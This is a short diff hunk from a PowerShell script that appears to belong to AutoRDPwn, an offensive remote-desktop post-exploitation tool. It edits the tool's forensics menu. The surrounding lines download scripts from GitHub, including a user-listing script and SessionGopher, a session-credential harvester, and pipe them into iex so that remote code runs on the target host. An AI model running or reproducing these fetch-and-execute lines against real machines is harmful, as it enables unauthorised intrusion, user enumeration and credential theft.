@@ -457,7 +457,7 @@ if($Language -in 'Spanish') {
 
         if($forensics -like '2') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
         Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/ListAllUsers.ps1 -UseBasicParsing | iex | Set-Clipboard ; Get-Clipboard
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; sleep -milliseconds 2500 }
+        ListAllUsers | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; sleep -milliseconds 2500 }
 	
 	if($forensics -like '3') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
         Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/SessionGopher.ps1 -UseBasicParsing | iex
